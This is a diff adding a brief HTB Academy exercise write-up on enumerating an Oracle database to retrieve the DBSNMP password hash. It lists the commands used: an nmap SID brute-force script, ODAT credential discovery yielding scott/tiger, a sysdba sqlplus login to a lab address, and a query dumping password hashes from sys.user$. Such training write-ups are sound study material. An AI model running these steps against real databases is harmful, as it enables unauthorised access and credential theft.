@@ -1,0 +1,9 @@
+1. Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
+
+In this case the hash can be found by simply repeating the steps on the page, which is effectively a walkthrough, this is as easy as it gets for HTB Academy exercises. 
+Even the username/password of scott/tiger that can be used to escelate privleges of the SQL database is the same as shown in the walkthrough.
+
+` sudo nmap -p1521 -sV <ADDRESS> --open --script oracle-sid-brute  : Returns XE as the SID. 
+` ./odat.py all -s <ADDRESS> : The credentials are discovered this way. scott/tiger
+` sqlplus scott/tiger@10.129.204.235/XE as sysdba
+` select name, password from sys.user$;
